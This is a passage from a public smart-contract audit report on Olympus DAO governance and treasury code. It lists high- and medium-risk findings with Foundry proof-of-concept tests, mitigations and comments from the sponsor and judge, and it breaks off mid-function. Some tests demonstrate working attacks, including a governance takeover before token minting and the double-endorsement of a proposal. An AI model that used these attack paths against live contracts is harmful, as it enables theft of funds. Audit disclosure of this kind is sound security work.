[L83](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/test/policies/Governance.t.sol#L83) included). The test is as follows:\n\n```solidity\n    function test_AttackerPassesProposalBeforeMinting() public {\n\n        address[] memory users = userCreator.create(1);\n        address attacker = users[0];\n        vm.prank(attacker);\n        MockMalicious attackerControlledContract = new MockMalicious();\n\n        Instruction[] memory instructions_ = new Instruction[](2);\n        instructions_[0] = Instruction(Actions.ChangeAdmin, address(attackerControlledContract));\n        instructions_[1] = Instruction(Actions.ChangeExecutor, address(attackerControlledContract));\n\n        vm.prank(attacker);\n        governance.submitProposal(instructions_, \"proposalName\", \"This is the proposal URI\");\n        \n        governance.endorseProposal(1);\n        \n        vm.prank(attacker);\n        governance.activateProposal(1);\n        \n        vm.warp(block.timestamp + 3 days + 1);\n        \n        governance.executeProposal();\n\n        assert(kernel.executor()==address(attackerControlledContract));\n        assert(kernel.admin()==address(attackerControlledContract));\n\n\n    }\n```\n\nwith\n\n```solidity\ncontract MockMalicious {}\n\n```\n\n### Recommended Mitigation Steps\n\nIn `Governance.sol` check for a minimum VOTES totalSupply, similiar to the expected initial supply of VOTES when they have been fairly distributed, for example at line [L164](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L164).\n\n**[fullyallocated (Olympus) acknowledged](https://github.com/code-423n4/2022-08-olympus-findings/issues/392)**\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/392#issuecomment-1249926401):**\n > Leaving as High severity as this shows a clear path to loss of funds.\n\n\n\n***\n\n## [[H-03] TRSRY: front-runnable `setApprovalFor`](https://github.com/code-423n4/2022-08-olympus-findings/issues/410)\n_Submitted by zzzitron, also found by berndartmueller, csanuragjain, pashov, Ruhum, sorrynotsorry, and Trust_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L64-L72><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L42-L48>\n\nAn attacker may be able to withdraw more than intended\n\n### Proof of Concept\n\nLet's say Alice had approval of 100. Now the treasury custodian reduced the approval to 50. Alice could frontrun the `setApprovalFor` of 50, and withdraw 100 as it was before. Then withdraw 50 with the newly set approval. So the alice could withdraw 150.\n\n```solidity\n// modules/TRSRY.sol\n\n 63     /// @notice Sets approval for specific withdrawer addresses\n 64     function setApprovalFor(\n 65         address withdrawer_,\n 66         ERC20 token_,\n 67         uint256 amount_\n 68     ) external permissioned {\n 69         withdrawApproval[withdrawer_][token_] = amount_;\n 70\n 71         emit ApprovedForWithdrawal(withdrawer_, token_, amount_);\n 72     }\n```\n\nThe `TreasuryCustodian` simply calls the `setApprovalFor` to grant Approval.\n\n```solidity\n 41\n 42     function grantApproval(\n 43         address for_,\n 44         ERC20 token_,\n 45         uint256 amount_\n 46     ) external onlyRole(\"custodian\") {\n 47         TRSRY.setApprovalFor(for_, token_, amount_);\n 48     }\n```\n\n### Recommended Mitigation Steps\n\nInstead of setting the given amount, one can reduce from the current approval. By doing so, it checks whether the previous approval is spend.\n\n**[ind-igo (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/410#issuecomment-1238901986):**\n > Understood. Will change the logic to increase/decrease allowances.\n\n**[0xean (judge) increased severity to High and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/410#issuecomment-1249816020):**\n > I think this vulnerability should be a high severity as it opens up the possibility of a direct loss of funds in the amount of up to the previous approval amount. Upgrading to High. \n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/410#issuecomment-1250385243):**\n > @ind-igo - Not sure if you deleted your comment, but that context is useful.  Happy to take another look here. \n\n**[ind-igo (Olympus) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/410#issuecomment-1251369022):**\n > I did, I just thought it was unnecessary to evaluate the issue. I was just saying that the context of the code is that it is not intended to be used to approve an EOA/multisig, but instead used to approve governance-voted contracts to access treasury funds, in order to deposit into yield contracts or whatever. But I don't think it's very relevant to this, as the code is still faulty and exploitable in an extreme case. I already have made this remediation as well, so all good.\n\n\n\n***\n\n \n# Medium Risk Findings (32)\n## [[M-01] `Operator::setReserveFactor` doesn't check if bond market should be changed](https://github.com/code-423n4/2022-08-olympus-findings/issues/83)\n_Submitted by rvierdiiev_\n\n`Operator::setReserveFactor` sets new `reserveFactor` value. This parameter is used in `fullCapacity` function to calculate how much capacity is available by high/low side. Then calculated capacity is used by `Range` module inside `regenerate` function to set the threshold of capacity for both sides of market. Then in `Range::updateCapacity` function this threshold is checked to understand if the wall should be down and the bond market should be closed.\n\nChanging this value means that the capacity of sides has changed and the sides should be regenarated to include this changes.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L548><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L711><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L133><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L145><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L185><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L780><br>\n\n### Recommended Mitigation Steps\n\nCall this after the param updating.<br>\n`_regenerate(true); _regenerate(false;`\n\n**[Oighty (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/83#issuecomment-1241054503):**\n > Forcing a regeneration when the reserveFactor is updated could cause unintended regeneration if a wall is currently down. A better approach may be to conditionally regenerate each side if they are active.\n\n**[Oighty (Olympus) acknowledged and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/83#issuecomment-1244128646):**\n > After discussing with the team more, we are going to leave this as-is. It is more flexible to not regenerate the side in this function. With the current implementation, the guardian can determine if the change should go into effect on the next regen, or if it should happen immediately. To enable immediately, they can manually call `regenerate`.\n\n\n\n***\n\n## [[M-02] Solmate `safetransfer` and `safetransferfrom` does not check the codesize of the token address, which may lead to fund loss](https://github.com/code-423n4/2022-08-olympus-findings/issues/117)\n_Submitted by djxploit, also found by brgltd_\n\nIn `getloan()` and `replayloan()`, the `safetransfer` and `safetransferfrom` doesn't check the existence of code at the token address. This is a known issue while using solmate's libraries.<br>\nHence this may lead to miscalculation of funds and may lead to loss of funds , because if `safetransfer()` and `safetransferfrom()` are called on a token address that doesn't have contract in it, it will always return success, bypassing the return value check. Due to this protocol will think that funds has been transferred and successful , and records will be accordingly calculated, but in reality funds were never transferred.<br>\nSo this will lead to miscalculation and possibly loss of funds\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L110><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L99>\n\n### Recommended Mitigation Steps\n\nUse openzeppelin's safeERC20 or implement a code existence check.\n\n**[ind-igo (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/117#issuecomment-1240019949):**\n > Confirmed. Will implement this. Thank you.\n\n\n\n***\n\n## [[M-03] RBS may redeploy funds automatically if price stays above or below wall for longer than `_config.regenWait`](https://github.com/code-423n4/2022-08-olympus-findings/issues/118)\n_Submitted by 0x52_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L195-L268><br>\n\nLoss of treasury funds.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L133-L139>\n\n    if (capacity_ < _range.high.threshold && _range.high.active) {\n        // Set wall to inactive\n        _range.high.active = false;\n        _range.high.lastActive = uint48(block.timestamp);\n\n\n        emit WallDown(true, block.timestamp, capacity_);\n    }\n\n\\_range.high.lastActive and \\_range.low\\.lastActive are only updated in RANGE.sol when \\_range.x.capacity < \\_range.x.threshold and the \\_range.x.active == true. After this is tripped, \\_range.x.active will be set to false, meaning that \\_range.x.lastActive will not be updated again until the wall is regenerated and capacity is restored.\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L209-L214>\n\n        if (\n            uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&\n            _status.high.count >= config_.regenThreshold\n        ) {\n            _regenerate(true);\n        }\n\nIf 1) the price were to sustain outside of the range (high volatility for volatile asset, black swan for stable) for longer than config\\_.regenWait and 2) config_regenThreshold satisfies the following equation:\n\n    config_.regenThreshold <= _config.regenObserve - config_.regenWait / frequency\n\nthen *status.high.count could be greater than config*.regenThreshold. This would trigger more funds to be deployed even though the price never came back inside the wall price.\n\nIn this scenario the wall price would be far from the true price of the asset leading to loss of treasury funds as it buys/sell at prices well above/below market price.\n\n### Recommended Mitigation Steps\n\nA check should be added to verify that the price is within the wall price before regenerating. Alternatively, config\\_.regenTheshold could be set to satisfy the following equation:\n\n    config_.regenThreshold > _config.regenObserve - config_.regenWait / frequency\n\nThis would eliminate the risk as \\_status.high.count >= config\\_.regenThreshold could never be true for a sustained period where current price is greater than the wall price.\n\n**[Oighty (Olympus) disagreed with severity and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/118#issuecomment-1235838436):**\n > This is valid. Our intended parameterization of the system would not be subject to this vulnerability, but it would be an issue if the system was incorrectly parameterized. Because it is an edge case, I'm not sure it is a high risk bug though.\n>\n > Another potential fix is resetting the `count` to 0 and the `observations` array to `new bool[](regenObserve)` to clear out positive values from when a wall goes down. This could be done in the `_updateCapacity()` function by checking if the new capacity is under the threshold.\n\n**[0xean (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/118#issuecomment-1252356234):**\n > Going to downgrade to Medium as the external dependency is a configuration that is not planned to be used by the sponsor. \n\n\n\n***\n\n## [[M-04] `OlympusGovernance#executeProposal`: reentrancy attack vulnerable function](https://github.com/code-423n4/2022-08-olympus-findings/issues/132)\n_Submitted by carlitox477, also found by cryptphi and ladboy233_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L265><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278-L288>\n\nGiven that the activeProposal change is done before the for loop, if this function is call through one `kernel.executeAction(instruction,target)` we can call the same instructions (in the same order) again and again, which may or may not affect funds (depending on the instructions).\n\n### Proof of Concept\n\nFor instance, if we install a new module, and this module has a vulnerability (even intentional), the next steps can by trigger:\n\n1.  Call executeAction\n2.  This allow us to call kernel.executeAction in the for loop\n3.  executAction allow us to call **\\_installModule**\n4.  **\\_installModule** allow us to call **newModule\\_.Init**\n5.  By init we can call now executeProposal again (suppose that the init function interact with a previous vulnerable proxy contract to scam voters to vote in favour of this proposal as if it was a contract which is ok, and before calling executeProposal we change the implementation to allow this attack),\n\n### Recommended Mitigation Steps\n\nUse nonReentrant modifier or move the line `activeProposal = ActivatedProposal(0, 0);` before the for loop.\n\n**[fullyallocated (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/132#issuecomment-1236240839):**\n > I don't know if funds are going to be threatened, but this does allow for a re-entrancy. Warden is correct in resetting the active Proposal before the for loop based on the checks-effects-interactions code design pattern.\n\n\n\n***\n\n## [[M-05] Proposals overwrite](https://github.com/code-423n4/2022-08-olympus-findings/issues/201)\n_Submitted by 0x1f8b_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L167><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L66>\n\nIt is possible to overwrite proposals in certain circumstances. The method `Governance.submitProposal` doesn't check if the `proposalId` (stored in a different contract) exists already as a valid proposal in `getProposalMetadata`.\n\n### Proof of Concept\n\nIf the project update the kernel module \"`INSTR`\" and reconfigure proposals and call `INSTR.store(instructions_);`, the counter may return a `proposalId` of an existing proposal and overwrite an existing previous one.\n\nThis is due to the fact that the proposals are saved in a mapping of a contract that is not related to the one that returns the counters, and furthermore, they do not check that the record already exists.\n\n```javascript\n        uint256 proposalId = INSTR.store(instructions_);\n        getProposalMetadata[proposalId] = ProposalMetadata(\n            title_,\n            msg.sender,\n            block.timestamp,\n            proposalURI_\n        );\n```\n\n### Recommended Mitigation Steps\n\n*   Store the proposal metadata in the same `INSTR` contract or ensure that the proposal doesn't exist.\n\n**[fullyallocated (Olympus) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/201#issuecomment-1234818897):**\n > Agreed with the validity of the circumstance, but it is contingent on us upgrading the contract in an unexpected way. Is the same as saying \"if you upgrade a contract incorrectly it can break the dependencies\". \n\n**[0xean (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/201#issuecomment-1249566680):**\n > Going to downgrade to medium based on some external requirements needing to be in place to be realized. \n> \n> `\n> Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> `\n> \n> Function of the protocol could be impacted and there are external requirements. \n\n\n\n***\n\n## [[M-06] After endorsing a proposal, user can transfer votes to another user for endorsing the same proposal again](https://github.com/code-423n4/2022-08-olympus-findings/issues/239)\n_Submitted by rbserver, also found by 0x1f8b, Bahurum, csanuragjain, and yixxas_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L9-L11><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L180-L201><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L205-L236>\n\nThe following comment indicates that the `OlympusVotes` contract is a stub for `gOHM`. Checking the `gOHM` contract at <https://etherscan.io/token/0x0ab87046fBb341D058F17CBC4c1133F25a20a52f#code>, the `transfer` and `transferFrom` functions are available.\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L9-L11>\n\n```solidity\n/// @notice Votes module is the ERC20 token that represents voting power in the network.\n/// @dev    This is currently a substitute module that stubs gOHM.\ncontract OlympusVotes is Module, ERC20 {\n```\n\nMoreover, the [documentation](https://hackmd.io/iWgqYLFwShGUDBF4zh397w#3-Vote-Redemption) states that the vote redemption mechanism \"exists to deter malicious behavior by ensuring users cannot transfer their voting tokens until after the proposal has been resolved\", which also indicates that the voting tokens are meant to be transferrable between users.\n\nWhen the voting tokens are transferrable, one user can first use her or his votes to call the following `endorseProposal` function to endorse a proposal and then transfer these votes to another user. The other user can use these votes to endorse the same proposal again afterwards. Because of the double-endorsement, the `(totalEndorsementsForProposal[proposalId_] * 100) < VOTES.totalSupply() * ENDORSEMENT_THRESHOLD` condition can become true so the proposal can be activated by calling the `activateProposal` function below. However, the proposal should only be endorsed with these same votes once and should not be able to be activated if it could not satisify `(totalEndorsementsForProposal[proposalId_] * 100) < VOTES.totalSupply() * ENDORSEMENT_THRESHOLD` with these votes being used once.\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L180-L201>\n\n```solidity\n    function endorseProposal(uint256 proposalId_) external {\n        uint256 userVotes = VOTES.balanceOf(msg.sender);\n\n        if (proposalId_ == 0) {\n            revert CannotEndorseNullProposal();\n        }\n\n        Instruction[] memory instructions = INSTR.getInstructions(proposalId_);\n        if (instructions.length == 0) {\n            revert CannotEndorseInvalidProposal();\n        }\n\n        // undo any previous endorsement the user made on these instructions\n        uint256 previousEndorsement = userEndorsementsForProposal[proposalId_][msg.sender];\n        totalEndorsementsForProposal[proposalId_] -= previousEndorsement;\n\n        // reapply user endorsements with most up-to-date votes\n        userEndorsementsForProposal[proposalId_][msg.sender] = userVotes;\n        totalEndorsementsForProposal[proposalId_] += userVotes;\n\n        emit ProposalEndorsed(proposalId_, msg.sender, userVotes);\n    }\n```\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L205-L236>\n\n```solidity\n    function activateProposal(uint256 proposalId_) external {\n        ProposalMetadata memory proposal = getProposalMetadata[proposalId_];\n\n        if (msg.sender != proposal.submitter) {\n            revert NotAuthorizedToActivateProposal();\n        }\n\n        if (block.timestamp > proposal.submissionTimestamp + ACTIVATION_DEADLINE) {\n            revert SubmittedProposalHasExpired();\n        }\n\n        if (\n            (totalEndorsementsForProposal[proposalId_] * 100) <\n            VOTES.totalSupply() * ENDORSEMENT_THRESHOLD\n        ) {\n            revert NotEnoughEndorsementsToActivateProposal();\n        }\n\n        if (proposalHasBeenActivated[proposalId_] == true) {\n            revert ProposalAlreadyActivated();\n        }\n\n        if (block.timestamp < activeProposal.activationTimestamp + GRACE_PERIOD) {\n            revert ActiveProposalNotExpired();\n        }\n\n        activeProposal = ActivatedProposal(proposalId_, block.timestamp);\n\n        proposalHasBeenActivated[proposalId_] = true;\n\n        emit ProposalActivated(proposalId_, block.timestamp);\n    }\n```\n\n### Proof of Concept\n\nPlease append the following test in `src\\test\\policies\\Governance.t.sol`. This test will pass to demonstrate the described scenario.\n\n```solidity\n    function testScenario_UserEndorsesAfterReceivingTransferredVotes() public {\n        _submitProposal();\n\n        vm.prank(voter2);\n        governance.endorseProposal(1);\n\n        // to simulate calling gOHM's transfer function by voter2 for sending votes to voter0, VOTES.transferFrom is called by governance here\n        vm.prank(address(governance));\n        VOTES.transferFrom(voter2, voter0, 200);\n\n        // voter0 uses the votes previously owned by voter2 to endorse the proposal\n        vm.prank(voter0);\n        governance.endorseProposal(1);\n\n        // the proposal is endorsed with 400 votes but only the 200 votes originally owned by voter2 are used\n        assertEq(governance.userEndorsementsForProposal(1, voter0), 200);\n        assertEq(governance.userEndorsementsForProposal(1, voter2), 200);\n        assertEq(governance.totalEndorsementsForProposal(1), 400);\n\n        // At this moment, the proposal can be activated successfully.\n        // However, if it is endorsed with only 200 votes, it cannot satisfy ENDORSEMENT_THRESHOLD and cannot be activated.\n        vm.expectEmit(true, true, true, true);\n        emit ProposalActivated(1, block.timestamp);\n\n        vm.prank(voter1);\n        governance.activateProposal(1);\n    }\n```\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nWhen calling `endorseProposal`, the user's votes can be locked by transferring these votes to the governance so the user cannot transfer these anymore to another user after the endorsement. An additional function can be added for reclaiming the endorsed votes back to the user and reducing the proposal's endorsed votes accordingly before the proposal is activated. After the proposal is activated, the endorsed votes should be counted as the voted votes.\n\n**[fullyallocated (Olympus) acknowledged and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/239#issuecomment-1235877496):**\n > Taken from another issue:\n> \n> >This is true, and I appreciate the throughness of the explanation—it's hard to adjust endorsements based on the user's balance because there's no events/callbacks in solidity. We plan to use a staking vault where tokens are transfer locked and there's a warmup period + cooldown period to mitigate this issue.\n\n\n\n***\n\n## [[M-07] Endorsed votes by a user do not decrease after the user's votes are revoked](https://github.com/code-423n4/2022-08-olympus-findings/issues/257)\n_Submitted by rbserver_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L180-L201>\n\nThe voter admin can call the following `revokeVotesFrom` function to revoke a user's votes, which also decreases the total supply of the votes, after the user endorses a proposal through calling the `endorseProposal` function below. Because `endorseProposal` can be called multiple times, the user has the incentive to call it for endorsing the proposal again with the new votes minted by the [`issueVotesTo`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L45-L48) function. However, after the user's votes are revoked, the user has no incentive to call `endorseProposal` again. Hence, the endorsed votes by the user for the proposal does not decrease after the user's votes are revoked. When determining whether the proposal can be activated or not, its old endorsed votes, which is not decreased, are compared against the new total supply of the votes, which is decreased because of the `revokeVotesFrom` call. As a result, the proposal is unreliably more likely to satisfy the condition for being activated.\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56>\n\n```solidity\n    function revokeVotesFrom(address wallet_, uint256 amount_) external onlyRole(\"voter_admin\") {\n        // Revoke the votes in the VOTES module\n        VOTES.burnFrom(wallet_, amount_);\n    }\n```\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L180-L201>\n\n```solidity\n    function endorseProposal(uint256 proposalId_) external {\n        uint256 userVotes = VOTES.balanceOf(msg.sender);\n\n        if (proposalId_ == 0) {\n            revert CannotEndorseNullProposal();\n        }\n\n        Instruction[] memory instructions = INSTR.getInstructions(proposalId_);\n        if (instructions.length == 0) {\n            revert CannotEndorseInvalidProposal();\n        }\n\n        // undo any previous endorsement the user made on these instructions\n        uint256 previousEndorsement = userEndorsementsForProposal[proposalId_][msg.sender];\n        totalEndorsementsForProposal[proposalId_] -= previousEndorsement;\n\n        // reapply user endorsements with most up-to-date votes\n        userEndorsementsForProposal[proposalId_][msg.sender] = userVotes;\n        totalEndorsementsForProposal[proposalId_] += userVotes;\n\n        emit ProposalEndorsed(proposalId_, msg.sender, userVotes);\n    }\n```\n\n### Proof of Concept\n\nPlease append the following test in `src\\test\\policies\\Governance.t.sol`. This test will pass to demonstrate the described scenario.\n\n```solidity\n    function testScenario_EndorsedVotesDoNotDecreaseAfterVotesAreRevoked() public {\n        _submitProposal();\n\n        // voter3 endorse the proposal\n        vm.prank(voter3);\n        governance.endorseProposal(1);\n\n        assertEq(governance.userEndorsementsForProposal(1, voter3), 300);\n        assertEq(governance.totalEndorsementsForProposal(1), 300);\n\n        // to simulate calling VoterRegistration.revokeVotesFrom that burns voter3's votes, VOTES.burnFrom is called by godmode here\n        vm.prank(godmode);\n        VOTES.burnFrom(voter3, 300);\n\n        // at this moment, voter3 has 0 votes\n        assertEq(VOTES.balanceOf(voter3), 0);\n\n        // however, the proposal is still endorsed with voter3's previous votes\n        assertEq(governance.userEndorsementsForProposal(1, voter3), 300);\n        assertEq(governance.totalEndorsementsForProposal(1), 300);\n    }\n```\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nWhen `revokeVotesFrom` is called during the time for endorsement, the corresponding votes that are previously endorsed for a proposal and are now revoked should be removed from the proposal's endorsed votes for the user. This ensures that the endorsed votes and the votes' total supply after the revocation are in sync for the proposal.\n\n**[fullyallocated (Olympus) acknowledged and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/257#issuecomment-1235877095):**\n > This is true, and I appreciate the throughness of the explanation—it's hard to adjust endorsements based on the user's balance because there's no events/callbacks in solidity. We plan to use a staking vault where tokens are transfer locked and there's a warmup period + cooldown period to mitigate this issue.\n\n\n\n***\n\n## [[M-08] \"TWAP\" used is an observation-weighted-average-price, not a time-weighted one](https://github.com/code-423n4/2022-08-olympus-findings/issues/267)\n_Submitted by IllIllI_\n\nWhile users are incentivized to call the heartbeat, the incentive may be removed later, or it may be more profitable to use old prices, so users may not call the heartbeat during unfavorable prices, leading to the TWAP price being incorrect, and users getting the wrong price for their assets.\n\nA similar case of an incomplete TWAP algorithm was found to be of [Medium](https://github.com/code-423n4/2022-06-nibbl-findings/issues/191) risk.\n\n### Proof of Concept\n\nA TWAP is a Time-Weighted average price, but the algorithm below does not take into account the time between observations:\n\n```solidity\nFile: /src/modules/PRICE.sol   #1\n\n134          // Calculate new moving average\n135          if (currentPrice > earliestPrice) {\n136              _movingAverage += (currentPrice - earliestPrice) / numObs;\n137          } else {\n138              _movingAverage -= (earliestPrice - currentPrice) / numObs;\n139          }\n140  \n141          // Push new observation into storage and store timestamp taken at\n142          observations[nextObsIndex] = currentPrice;\n143          lastObservationTime = uint48(block.timestamp);\n144:         nextObsIndex = (nextObsIndex + 1) % numObs;\n```\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L134-L144>\n\nWhile the `Heart` policy enforces an upper bound on how frequently updates are added to the average, there is no guarantee that users call `beat()` in a timely manner:\n\n```solidity\nFile: /src/policies/Heart.sol   #2\n\n92       function beat() external nonReentrant {\n93           if (!active) revert Heart_BeatStopped();\n94:          if (block.timestamp < lastBeat + frequency()) revert Heart_OutOfCycle();\n```\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L92-L94>\n\nThe incentive may be set to too low an amount:\n\n```solidity\nFile: /src/policies/Heart.sol   #3\n\n140      function setRewardTokenAndAmount(ERC20 token_, uint256 reward_)\n141          external\n142          onlyRole(\"heart_admin\")\n143      {\n144          rewardToken = token_;\n145          reward = reward_;\n146          emit RewardUpdated(token_, reward_);\n147:     }\n```\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L140-L147>\n\nOr users may find it more profitable to skip a particular update, or front-run an unfavorable update, with a transaction that trades assets at the old price\n\n### Recommended Mitigation Steps\n\nAlways call an internal version of `beat()` that doesn't revert, in functions that swap user assets. The code should also track the timestamps of when each `beat()` is called, and include the amount of time that has passed since the last beat, in the TWAP calculation\n\n**[Oighty (Olympus) disagreed with severity and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/267#issuecomment-1241043919):**\n > The referenced issue is a bit different than our use case since we will be using a much longer duration moving average. The goal is to get an approximate moving average over a certain period of time (e.g. 120 days) vs. an exact number since, as you say, the time of each observation cannot be guaranteed to be at a specific time. We believe that using a long duration with a sufficient number of observations will make this value close enough to the true value it is approximating, and prevents actors from manipulating the value by waiting to provide a specific value (1 out of ~360 obs doesn't move the needle). The use of the \"TWAP\" term may be semantically inaccurate.\n> \n> As for not guaranteeing that the update will be called or issues with several observations close to each other, see comments on [#405](https://github.com/code-423n4/2022-08-olympus-findings/issues/405) and [#79](https://github.com/code-423n4/2022-08-olympus-findings/issues/79).\n> \n> The mitigations suggested do not seem to provide a solution that improves the system. Calling `beat()` on user actions would not have the observations roughly evenly spaced. Tracking timestamps is possible, but I don't see how it improves the data.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/267#issuecomment-1251044977):**\n > @Oighty - I think the warden is suggesting that the call to beat() in the user actions would do more to ensure that the \"TWAP\" stays up to date.  If the call isn't past the correct period, it would just return and make no change (costing some amount of gas, ofc).\n> \n> I do think it may be worth considering, that way no user action can take place without the TWAP being as up to date as possible and no additional calls to the contract may be necessary if users are interacting with the contract frequently enough. \n> \n> While this is related to [#79](https://github.com/code-423n4/2022-08-olympus-findings/issues/79) - I think the points raised here and the mitigation is sufficiently different to warrant this issue to stand alone.  \n\n**[Oighty (Olympus) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/267#issuecomment-1255235303):**\n > That's a fair point. One issue with calling `beat` on user actions, e.g. `Operator.swap`, is that it would update the wall price that the user is swapping at. Therefore, the call could fail due to the slippage check. This could be confusing behavior and may have unintended consequences of DOS'ing the system. Additionally, the gas cost of `beat` is highly variable (sometimes up to 600k gas when opening a bond market) and would cause some users to unexpectedly pay a lot more gas for a swap.\n> \n> I'll discuss with the team, but I don't think the pros exceed the cons.\n\n\n\n***\n\n## [[M-09] `activateProposal()` need time delay](https://github.com/code-423n4/2022-08-olympus-findings/issues/273)\n_Submitted by &#95;&#95;141345&#95;&#95;, also found by 0x1f8b, Trust, V&#95;B, and zzzitron_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L205-L262><br>\n\nThere is no time lock or delay when activating a proposal, the previous one could be replaced immediately. In `vote()` call, a user might want to vote for the previous proposal, but if the `vote()` call and the `activateProposal()` is very close or even in the same block, it is quite possible that the user actually voted for another proposal without much knowledge of. A worse case is some malicious user watching the mempool, and front run a big vote favor/against the `activeProposal`, effectively influence the voting result.\n\nThese situations are not what the governance intends to deliver, and might also affect the results of 2 proposals.\n\n### Proof of Concept\n\n`activateProposal()` can take effect right away, replacing the `activeProposal`. And `vote()` does not specify which `proposalId` to vote for, but the `activeProposal` could be different from last second.\n\nsrc/policies/Governance.sol\n\n```solidity\n    function activateProposal(uint256 proposalId_) external {\n        ProposalMetadata memory proposal = getProposalMetadata[proposalId_];\n\n        if (msg.sender != proposal.submitter) {\n            revert NotAuthorizedToActivateProposal();\n        }\n\n        if (block.timestamp > proposal.submissionTimestamp + ACTIVATION_DEADLINE) {\n            revert SubmittedProposalHasExpired();\n        }\n\n        if (\n            (totalEndorsementsForProposal[proposalId_] * 100) <\n            VOTES.totalSupply() * ENDORSEMENT_THRESHOLD\n        ) {\n            revert NotEnoughEndorsementsToActivateProposal();\n        }\n\n        if (proposalHasBeenActivated[proposalId_] == true) {\n            revert ProposalAlreadyActivated();\n        }\n\n        if (block.timestamp < activeProposal.activationTimestamp + GRACE_PERIOD) {\n            revert ActiveProposalNotExpired();\n        }\n\n        activeProposal = ActivatedProposal(proposalId_, block.timestamp);\n\n        proposalHasBeenActivated[proposalId_] = true;\n\n        emit ProposalActivated(proposalId_, block.timestamp);\n    }\n\n    function vote(bool for_) external {\n        uint256 userVotes = VOTES.balanceOf(msg.sender);\n\n        if (activeProposal.proposalId == 0) {\n            revert NoActiveProposalDetected();\n        }\n\n        if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {\n            revert UserAlreadyVoted();\n        }\n\n        if (for_) {\n            yesVotesForProposal[activeProposal.proposalId] += userVotes;\n        } else {\n            noVotesForProposal[activeProposal.proposalId] += userVotes;\n        